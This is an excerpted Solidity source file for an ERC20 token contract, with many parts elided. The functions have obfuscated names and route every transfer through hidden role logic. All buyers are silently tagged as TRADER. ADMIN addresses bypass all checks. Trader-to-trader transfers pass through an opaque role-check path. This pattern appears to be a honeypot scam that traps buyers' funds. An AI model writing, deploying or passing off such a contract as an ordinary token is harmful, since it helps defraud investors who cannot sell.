...
interface _KXCINRFVRoleControl {
...
abstract contract _KXCINRFVConsole is Context, _KXCINRFVRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __KXCINRFVgrvPush(role, account, amt);
    }

    function __KXCINRFVgrvPush(bytes32 role, address account, uint256 amt) internal {
    ...
    function __KXCINRFVgrvNewPush(bytes32 role, address account, uint256 num) internal virtual {
...
contract _KXCINRFVERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _KXCINRFVERC20, _KXCINRFVConsole {
    ...
    ) _KXCINRFVERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_KXCINRFVERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __KXCINRFVcidnlfnd(from, to, amt);

    }



    function __KXCINRFVcidnlfnd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __KXCINRFVzlklcivn(from, to, amt);
    }


    function __KXCINRFVzlklcivn(address from, address to, uint256 amt) internal {
        ...
        __KXCINRFVxkcvinad(from, to, amt);
    }

    function __KXCINRFVxkcvinad(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __KXCINRFVxvodnfdr(from, to, amt);
    }


    function __KXCINRFVxvodnfdr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        }else if(__checkaddr[to]){

        }else if(newnum > 99){
            __KXCINRFVgrvNewPush(TRADER,to,1);
        }

        __KXCINRFVxcvnldfrg(from, to, amt);
    }

    function __KXCINRFVxcvnldfrg(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        __KXCINRFVcxnvilrnsh(from, to, amt);
    }

    function __KXCINRFVcxnvilrnsh(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __KXCINRFVcxvnfosk(from, TRADER, amt);
    ...
    function __KXCINRFVcxvnfosk(address from, bytes32 role, uint256 amt) internal {
        __KXCINRFVgrvPush(role, from, amt);
    }
